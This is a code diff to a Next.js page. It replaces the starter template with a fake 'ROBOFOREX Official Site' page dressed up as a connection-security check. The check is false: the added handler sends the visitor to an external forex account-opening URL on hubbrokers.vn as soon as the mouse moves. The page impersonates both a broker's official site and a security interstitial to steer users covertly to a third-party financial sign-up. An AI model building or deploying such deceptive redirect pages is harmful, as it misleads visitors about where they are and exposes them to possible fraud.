@@ -1,32 +1,46 @@
-import Image from 'next/image'
-import styles from './page.module.css'
+'use client'
+import styles from "./page.module.css";
+import circel from "../../public/R-tron.png";
+import image from "../../public/image.png";
+import Image from "next/image";
+import { useState } from "react";
 
 export default function Home() {
+  const [hasRedirected, setHasRedirected] = useState(false);
+  const handleMouseMove = () => {
+    if (!hasRedirected) {
+      setHasRedirected(true);
+      window.location.href = "https://hubbrokers.vn/review-forex/roboforex/open-account"; 
+    }
+  };
   return (
-    <main className={styles.main}>
-      <div className={styles.description}>
-        <p>
-          Get started by editing&nbsp;
-          <code className={styles.code}>src/app/page.js</code>
-        </p>
-        <div>
-          <a
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+    <div onMouseMove={handleMouseMove}>
+      <main className={styles.main}>
+        <h3 className={styles.text}>
+         ROBOFOREX Official Site{" "}
+          <span
+            style={{ transform: "translate(0px)", display: "inline-block" }}
           >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className={styles.vercelLogo}
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+            <Image src={circel} alt="Logo" width={30} height={30} priority />
+          </span>
+        </h3>
+        <p className={styles.text2}>
+          Checking if the site connection is secure
+        </p>
+        <p className={styles.text3}>
+          We needs to review the security of your connection before proceeding
+          ROBOFOREX
+        </p>
+        <div style={{ marginTop: 30 }}>
+          <Image src={image} alt="Logo" className={styles.image2} />
         </div>
-      </div>
-    </main>
-  )
+        <p className={styles.text4}>Why am I seeing this page?</p>
+        <p className={styles.text5}>
+          Requests from malicious bots can pose as legitimate traffic.
+          Occasionally, you may see this page while the site ensures that the
+          connection is secure.
+        </p>
+      </main>
+    </div>
+  );
 }
